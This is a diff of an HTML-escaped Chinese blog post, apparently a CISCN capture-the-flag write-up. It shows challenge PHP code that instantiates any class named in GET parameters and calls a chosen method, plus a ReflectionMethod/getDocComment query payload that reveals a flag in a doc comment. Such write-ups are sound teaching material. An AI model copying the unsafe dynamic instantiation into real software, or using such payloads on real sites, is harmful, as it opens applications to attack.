+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$rc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$rb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ra&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ra&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$rd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$rc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ra&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$rb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$rd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个&lt;code&gt;$ra&lt;/code&gt;、&lt;code&gt;$rb&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;，源码虽然给出了&lt;code&gt;User&lt;/code&gt;类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。&lt;/p&gt;
 &lt;p&gt;根据提示&lt;/p&gt;
 &lt;blockquote&gt;
@@ -158,10 +306,24 @@
     &gt;mixed&lt;/a&gt; &lt;code&gt;$class&lt;/code&gt; , string &lt;code&gt;$name&lt;/code&gt; )&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?rc=ReflectionMethod&amp;amp;ra=User&amp;amp;rb=q&amp;amp;rd=getDocComment
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;你能发现我吗string(152) &amp;#34;/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题外话：在尝试过程中还发现了另一个类&lt;code&gt;ReflectionClass&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?rc=ReflectionMethod&amp;amp;ra=User&amp;amp;rb=q&amp;amp;rd=getDocComment
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;你能发现我吗string(152) &amp;#34;/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;题外话：在尝试过程中还发现了另一个类&lt;code&gt;ReflectionClass&lt;/code&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;简介：&lt;strong&gt;ReflectionClass&lt;/strong&gt; 类报告了一个类的有关信息。&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;和上面的那个类对比，两个类研究的对象不一样&lt;strong&gt;ReflectionMethod&lt;/strong&gt;研究的是类中的方法，&lt;strong&gt;ReflectionClass&lt;/strong&gt; 研究的是类。&lt;/p&gt;
